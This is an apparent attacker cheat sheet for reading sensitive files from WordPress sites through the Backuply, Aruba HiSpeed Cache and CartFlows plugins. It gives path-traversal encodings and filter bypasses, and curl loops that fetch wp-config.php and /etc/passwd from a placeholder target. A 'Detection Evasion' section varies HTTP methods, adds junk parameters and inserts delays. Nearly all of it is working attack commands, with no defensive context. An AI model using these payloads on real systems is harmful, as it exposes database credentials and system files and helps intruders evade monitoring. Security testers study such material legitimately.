## Encoding Variations

### URL Encoding
```
%2e%2e%2f = ../
%2E%2E%2F = ../
%252e%252e%252f = ../ (double encoded)
%c0%ae = ../ (UTF-8)
```

### Path Traversal Tricks
```
..%5c = ..\ (Windows)
....// = ../  (bypass simple filters)
..%00 = ../ (null byte)
.../ = (extra dot)
./.. = (current dir + parent)
```

### Action Parameters
```
?action=plugin_name
?action=plugin_name_ajax
?action=wp_ajax_plugin
?nopriv=1&action=plugin_action
?_wpnonce=NONCE&action=action
```

## Bash One-Liners for Testing

```bash
# Test all three plugins with basic wp-config.php
for plugin in backuply aruba cartflows; do
  curl -s "http://target/wp-admin/admin-ajax.php?action=${plugin}&file=wp-config.php" | head -20
done

# Test path traversal
for depth in {1..10}; do
  path=$(printf '../%.0s' {1..$depth})
  curl -s "http://target/wp-admin/admin-ajax.php?action=backuply_backup&file=${path}etc/passwd" | grep -q "root" && echo "Found at depth $depth"
done

# Test with different actions
for action in "cartflows_debug" "cartflows_get_logs" "cartflows_log_status" "cartflows_admin_menu"; do
  echo "Testing $action..."
  curl -s "http://target/wp-admin/admin-ajax.php?action=$action&file=wp-config.php" | head -5
done

# Automated scanning
curl -s "http://target/wp-admin/admin-ajax.php?action=backuply_backup&file=wp-config.php" -o backuply.txt
curl -s "http://target/wp-admin/admin.php?page=aruba-hispeed-cache&file=wp-config.php" -o aruba.txt
curl -s "http://target/wp-admin/admin-ajax.php?action=cartflows_debug&file=wp-config.php" -o cartflows.txt
```

## Detection Evasion

### Using Different HTTP Methods:
```
GET /wp-admin/admin-ajax.php?action=backuply&file=wp-config.php
HEAD /wp-admin/admin-ajax.php?action=backuply&file=wp-config.php
OPTIONS /wp-admin/admin-ajax.php?action=backuply&file=wp-config.php
TRACE /wp-admin/admin-ajax.php?action=backuply&file=wp-config.php
```

### Adding Noise:
```
?action=backuply&file=wp-config.php&randomParam=value&foo=bar&baz=qux
```

### Timing Delays:
```bash
sleep 1 && curl "http://target/wp-admin/admin-ajax.php?action=backuply&file=wp-config.php"
```
